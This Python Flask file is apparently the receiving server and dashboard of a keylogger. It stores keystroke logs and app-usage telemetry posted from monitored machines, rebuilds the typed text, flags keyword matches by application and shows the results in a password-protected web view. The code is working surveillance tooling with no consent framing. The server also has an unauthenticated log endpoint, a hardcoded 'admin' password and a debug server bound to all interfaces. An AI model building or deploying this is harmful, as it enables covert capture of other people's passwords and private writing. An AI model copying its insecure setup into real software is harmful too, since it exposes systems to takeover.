from flask import Flask, render_template, jsonify, request, session, redirect, url_for # type: ignore
import re
import datetime
from collections import Counter
import os
from typing import List, Dict, Tuple, Any
from functools import wraps

app = Flask(__name__)
app.secret_key = os.urandom(24)

DEFAULT_PASSWORD = "admin"

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function

# 🔹 Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_PATH = os.path.join(BASE_DIR, "received_logs.txt")
KEYWORDS_PATH = os.path.join(BASE_DIR, "keywords.txt")
APP_LOG_PATH = os.path.join(BASE_DIR, "app_activity.log")

# 🔹 Sensitive keywords
def load_keywords():
    if not os.path.exists(KEYWORDS_PATH):
        return []
    with open(KEYWORDS_PATH, "r", encoding="utf-8") as f:
        return [line.strip().lower() for line in f]

KEYWORDS = load_keywords()

# 🔹 Convert keylog into readable text
def parse_keylog(file_path):
    readable_text = ""

    if not os.path.exists(file_path):
        return "Log file not found."

    try:
        with open(file_path, "r", encoding="utf-8") as file:
            lines = file.readlines()
    except:
        return "Unable to read log file."

    for line in lines:
        if " - " not in line:
            continue

        parts = line.split(" - ", 1)
        if len(parts) < 2:
            continue
            
        key_part = parts[1].strip()

        if len(key_part) == 1:
            readable_text += key_part
        elif "<" in key_part and ">" in key_part:
            ascii_code = re.findall(r"<(\d+)>", key_part)
            if ascii_code:
                readable_text += chr(int(ascii_code[0]))
        elif "Key.backspace" in key_part:
            readable_text = readable_text[:-1] # type: ignore
        elif "Key.enter" in key_part:
            readable_text += "\n"
        elif "Key.space" in key_part:
            readable_text += " "
        else:
            continue

    return readable_text


# 🔹 Detect sensitive keywords
def detect_keywords(text: str) -> List[str]:
    found_words: List[str] = []
    words = text.split()

    for word in words:
        for keyword in KEYWORDS:
            if keyword and keyword.lower() in word.lower():
                found_words.append(word)

    return list(set(found_words))


# 🔹 Word frequency
def word_frequency(text: str) -> List[Any]:
    words = re.findall(r'\b\w+\b', text.lower())
    if not words:
        return []
    return Counter(words).most_common(10)


# 🔹 Log Receiver API from server.py (runs on port 2000)
@app.route("/log", methods=["POST"])
def receive_log():
    data = request.json

    if not data or "logs" not in data:
        return jsonify({"status": "error", "message": "No log data"}), 400

    logs = data["logs"]

    with open(LOG_PATH, "a", encoding="utf-8") as f:
        for line in logs:
            f.write(line + "\n")

    print(f"Received {len(logs)} log lines")

    return jsonify({"status": "success", "received": len(logs)})


# 🔹 App Activity Receiver API
@app.route("/app-activity", methods=["POST"])
def receive_app_activity():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400
    
    app_name = data.get("app")
    title = data.get("title")
    duration = data.get("duration")
    timestamp = data.get("timestamp")

    with open(APP_LOG_PATH, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} | {app_name} | {duration} | {title}\n")

    return jsonify({"status": "success"})


def get_app_stats() -> List[Dict[str, Any]]:
    """Aggregate app usage stats from the log file."""
    stats: Dict[str, float] = {}
    if not os.path.exists(APP_LOG_PATH):
        return []
    
    try:
        with open(APP_LOG_PATH, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split(" | ")
                if len(parts) >= 3:
                    app = parts[1]
                    try:
                        duration = float(parts[2])
                        stats[app] = stats.get(app, 0.0) + duration
                    except ValueError:
                        continue
    except Exception as e:
        print(f"Error reading app log: {e}")
        
    # Format for Chart.js: list of {app: name, duration: time}
    return sorted([{"app": k, "duration": round(v, 2)} for k, v in stats.items()], key=lambda x: x['duration'], reverse=True) # type: ignore


def get_daily_app_stats() -> Dict[str, Dict[str, float]]:
    """Aggregate app usage stats grouped by day from the log file."""
    daily_stats: Dict[str, Dict[str, float]] = {}
    if not os.path.exists(APP_LOG_PATH):
        return daily_stats
    
    try:
        with open(APP_LOG_PATH, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split(" | ")
                if len(parts) >= 3:
                    timestamp_str = parts[0]
                    app = parts[1]
                    try:
                        duration = float(parts[2])
                        # Extract the date part (YYYY-MM-DD) from timestamp like 2026-03-16T11:46:37.438566
                        date_str = timestamp_str.split("T")[0]
                        if date_str not in daily_stats:
                            daily_stats[date_str] = {}
                        daily_stats[date_str][app] = daily_stats[date_str].get(app, 0) + duration
                    except ValueError:
                        continue
    except Exception as e:
        print(f"Error reading app log for daily stats: {e}")
    
    # Round durations
    for date in daily_stats:
        for app in daily_stats[date]:
            daily_stats[date][app] = round(daily_stats[date][app], 2) # type: ignore
            
    return daily_stats


def get_risk_alerts() -> List[Dict[str, Any]]:
    # 1. Parse app activity to build a timeline of active apps
    app_timeline = []
    if os.path.exists(APP_LOG_PATH):
        try:
            with open(APP_LOG_PATH, "r", encoding="utf-8") as f:
                for line in f:
                    parts = line.strip().split(" | ")
                    if len(parts) >= 3:
                        timestamp_str = parts[0]
                        app = parts[1]
                        # Handle replacing T if present to parse nicely
                        timestamp_str = timestamp_str.replace("T", " ")
                        try:
                            # Parse format string, robust against microseconds
                            dt = datetime.datetime.strptime(timestamp_str[:19], "%Y-%m-%d %H:%M:%S")
                            app_timeline.append((dt, app))
                        except ValueError:
                            pass
        except Exception:
            pass
    
    app_timeline.sort(key=lambda x: x[0])

    # Helper function to get app at a specific time
    def get_app_at_time(dt):
        active_app = "Unknown App"
        for i in range(len(app_timeline) - 1, -1, -1):
            if app_timeline[i][0] <= dt:
                active_app = app_timeline[i][1]
                break
        return active_app

    # 2. Extract sensitive words from received_logs.txt
    sensitive_events: List[Dict[str, Any]] = [] 
    if not os.path.exists(LOG_PATH):
        return []

    try:
        with open(LOG_PATH, "r", encoding="utf-8") as f:
            lines = f.readlines()
    except:
        return []

    current_word = ""
    word_start_time = None

    for line in lines:
        if " - " not in line:
            continue
        parts = line.split(" - ", 1)
        if len(parts) < 2:
            continue
        
        time_part = parts[0].strip()
        key_part = parts[1].strip()

        try:
            dt = datetime.datetime.strptime(time_part[:19], "%Y-%m-%d %H:%M:%S")
        except ValueError:
            continue

        if len(key_part) == 1:
            if not current_word:
                word_start_time = dt
            current_word += key_part
        elif "<" in key_part and ">" in key_part:
            ascii_code = re.findall(r"<(\d+)>", key_part)
            if ascii_code:
                if not current_word:
                    word_start_time = dt
                current_word += chr(int(ascii_code[0]))
        elif "Key.backspace" in key_part:
            current_word = current_word[:-1]
        elif "Key.enter" in key_part or "Key.space" in key_part or key_part.startswith("[Key."):
            # Check if current word contains a sensitive keyword
            if current_word:
                for keyword in KEYWORDS:
                    if keyword and keyword.lower() in current_word.lower():
                        app = get_app_at_time(word_start_time or dt)
                        sensitive_events.append({
                            "time": word_start_time or dt,
                            "word": current_word,
                            "app": app
                        })
                        break
                current_word = ""
                word_start_time = None
    
    # Check trailing word
    if current_word:
        for keyword in KEYWORDS:
            if keyword and keyword.lower() in current_word.lower():
                app = get_app_at_time(word_start_time or datetime.datetime.now())
                sensitive_events.append({
                    "time": word_start_time or datetime.datetime.now(),
                    "word": current_word,
                    "app": app
                })
                break
                
    # 3. Group sensitive events into incidents (2 min window per app)
    incidents: List[Dict[str, Any]] = []
    if not sensitive_events:
        return []

    # Sort events by time
    sensitive_events.sort(key=lambda x: x['time'])

    current_incident = {
        "start_time": sensitive_events[0]['time'],
        "end_time": sensitive_events[0]['time'],
        "words": [sensitive_events[0]['word']],
        "app": sensitive_events[0]['app']
    }

    for event in sensitive_events[1:]:
        time_diff = (event['time'] - current_incident["end_time"]).total_seconds()
        if time_diff <= 120 and event['app'] == current_incident['app']:
            current_incident["end_time"] = event['time']
            current_incident["words"].append(event['word'])
        else:
            incidents.append(current_incident)
            current_incident = {
                "start_time": event['time'],
                "end_time": event['time'],
                "words": [event['word']],
                "app": event['app']
            }
    incidents.append(current_incident)

    # 4. Format incidents into risk alerts
    alerts = []
    incidents.sort(key=lambda x: x['end_time'], reverse=True)

    for inc in incidents:
        word_count = len(inc['words'])
        if word_count >= 3:
            severity = "High"
        elif word_count == 2:
            severity = "Medium"
        else:
            severity = "Low"
            
        alert_name = "Potential Data Leakage"
        nsfw_keywords = ["porn", "sex", "boob", "ass", "xvideos", "nsfw"]
        for w in inc['words']:
            if any(n in w.lower() for n in nsfw_keywords):
                alert_name = "NSFW Activity Spike"
                break
                
        alerts.append({
            "name": alert_name,
            "severity": severity,
            "app": inc['app'],
            "word_count": word_count,
            "words": list(set(inc['words'])),
            "time": inc['end_time'].strftime("%Y-%m-%d %H:%M:%S")
        })

    return alerts[:10]


# 🔹 Raw App Telemetry API (last 50 entries)
@app.route("/app-telemetry")
@login_required
def app_telemetry():
    entries = []
    if os.path.exists(APP_LOG_PATH):
        try:
            with open(APP_LOG_PATH, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
            for line in lines[-50:]: # type: ignore
                parts = line.split(" | ")
                if len(parts) >= 4:
                    entries.append({
                        "timestamp": parts[0],
                        "app": parts[1],
                        "duration": parts[2],
                        "title": parts[3]
                    })
        except Exception as e:
            print(f"Error reading telemetry: {e}")
    return jsonify(list(reversed(entries)))


# 🔹 Login Page
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == DEFAULT_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid password")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))

# 🔹 Main dashboard page
@app.route("/")
@login_required
def dashboard():
    parsed_text = parse_keylog(LOG_PATH)
    detected_words = detect_keywords(parsed_text)
    frequency = word_frequency(parsed_text)

    return render_template(
        "dashboard.html",
        text=parsed_text,
        detected=detected_words,
        frequency=frequency
    )


# 🔹 Live data API (updates every second)
@app.route("/live-data")
@login_required
def live_data():
    parsed_text = parse_keylog(LOG_PATH)
    detected_words = detect_keywords(parsed_text)
    frequency = word_frequency(parsed_text)
    app_stats = get_app_stats()
    daily_app_stats = get_daily_app_stats()
    risk_alerts = get_risk_alerts()

    return jsonify({
        "text": parsed_text,
        "detected": detected_words,
        "frequency": frequency,
        "app_stats": app_stats,
        "daily_app_stats": daily_app_stats,
        "risk_alerts": risk_alerts
    })


if __name__ == "__main__":
    # Running on 0.0.0.0 and port 2000 because frontend defaults to sending to 2000
    app.run(host="0.0.0.0", debug=True, port=2000)
